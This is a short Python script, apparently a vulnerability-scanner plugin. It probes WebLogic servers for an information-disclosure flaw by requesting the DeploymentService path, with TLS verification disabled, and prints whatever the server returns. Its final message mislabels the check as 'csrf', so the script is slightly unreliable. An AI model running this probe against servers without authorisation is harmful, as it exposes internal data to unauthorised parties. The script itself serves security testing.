#-*- coding: utf-8 -*-


import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if weblogic interface information disclose vul')
    try:
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/bea_wls_deployment_internal/DeploymentService"
        vulnurl = url + payload
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False, allow_redirects=False)
        if req.status_code == 200 and req.text != '':
            print(req.text)
            msg = 'There is weblogic interface information disclose vul on url: ' +vulnurl+ ' .'
            print(msg)
            number = 'v87'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no weblogic csrf vul'
    number = 'v0'
    return False,url,number,msg
